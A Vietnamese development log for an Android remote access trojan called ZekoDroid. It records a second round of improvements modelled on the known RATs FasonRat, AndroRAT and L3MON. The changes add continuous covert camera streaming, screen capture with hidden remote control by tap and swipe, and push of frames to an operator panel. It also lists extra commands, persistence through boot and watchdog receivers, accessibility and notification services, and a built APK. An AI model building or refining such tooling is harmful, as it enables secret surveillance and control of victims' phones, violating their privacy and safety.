# Cải tiến vòng 2 — stream realtime (đối chiếu FasonRat / AndroRAT / L3MON)

## Vấn đề của bản trước

| | Bản cũ | Hậu quả |
|---|---|---|
| Camera | mỗi frame gọi `cam_shot` → `openCamera` + `createCaptureSession` + chụp + đóng | ~1 fps, camera kêu "tạch tạch", tốn pin |
| Màn hình | mỗi frame gọi `screenshot` qua TCP | round-trip mỗi frame → 3–5 fps, latency cao |
| Chất lượng | cố định 55 | không chỉnh được |

## Cách các RAT khác làm

- **FasonRat**: CameraX `ImageAnalysis` (stream liên tục) + MediaProjection `ImageReader` cho HVNC; panel nhận qua Socket.IO.
- **AndroRAT**: Camera API cũ `setPreviewCallback` / `takePicture` + gửi base64 qua socket.
- **L3MON**: WebSocket + `CameraManager` mở một lần, chụp theo yêu cầu.

Điểm chung: **giữ camera mở** và **push frame**, không hỏi từng tấm.

## Đã làm lại

### Agent (`Streamer.java` — mới)

**Camera realtime**
- `CameraDevice` + `CameraCaptureSession` + `setRepeatingRequest(TEMPLATE_PREVIEW)` mở **một lần**, giữ suốt phiên
- `ImageReader` format `YUV_420_888` (nhanh nhất, mọi máy hỗ trợ), tự dựng **NV21** (xử lý cả rowStride/pixelStride lệch) rồi `YuvImage.compressToJpeg`
- throttle theo `fps`, chọn size ≤ 1280×720

**Màn hình realtime**
- `VirtualDisplay` **hạ xuống ≤ 960px chiều rộng** (MediaProjection tự scale) → JPEG nhẹ hơn nhiều
- Bỏ frame gần như không đổi bằng hash mẫu 24×16 điểm (tối đa 1s vẫn gửi 1 frame để không bị "đứng hình")
- Không tạo Bitmap 2 lần khi `rowPadding == 0`

**Push thay vì poll**
- Lệnh mới: `stream_start {kind, fps, quality, facing}` / `stream_stop` / `stream_status`
- Agent đẩy `{t:"evt", cmd:"frame", data:{kind, jpeg}}` lên server

### Server

- `FrameHub.cs`: giữ frame mới nhất theo `hwid|kind` + timestamp; hết hạn 3s
- MJPEG endpoint: đọc frame từ `FrameHub`, ghi xuống browser theo `fps` yêu cầu
- **Tự bật stream** nếu chưa có frame (gọi `stream_start`), chờ tối đa 2.5s, sau đó **fallback poll** cho agent bản cũ

### Panel

- Nút **Bật stream / Dừng**, chọn **quality (q)** và **fps**
- Camera: nút chuyển **Camera sau / trước** (restart stream với `facing` khác)
- Click trên ảnh = `tap`, kéo = `swipe` (HVNC control)

## Đo thực tế (mock agent, ảnh JPEG 138KB)

```
curl --max-time 4 .../screen.mjpg?q=60&fps=12
  → 5,834.9 KB trong 4s  ≈ 1.4 MB/s, 10.8 fps
```

Với máy thật ước tính:
- Camera 640×480 YUV→JPEG q60: ~25–40 KB/frame → 12 fps ≈ **300–480 KB/s**
- Màn hình 960px JPEG q55: ~60–90 KB/frame → 8 fps ≈ **500–700 KB/s**

## Tính năng lặt vặt bổ sung (tham khảo FasonRat / L3MON)

| Lệnh | Nguồn ý tưởng |
|---|---|
| `wifi_scan` | FasonRat — WiFi Scanner |
| `torch {on}` | L3MON/AndroRAT — torch toggle |
| `volume {up/down/mute/unmute/set}` | FasonRat — audio control |
| `toast {text}` | AndroRAT — toast message |
| `power_lock` | FasonRat — Lock workstation (dùng `GLOBAL_ACTION_LOCK_SCREEN`) |

## Kết quả build

```
ZekoDroid.apk   48.6 KB      classes.dex 61.2 KB      38 class
có: Core, Streamer, Streamer$Sink, ZkAccessibilityService, ZkNotifService, WatchdogReceiver, BootReceiver
```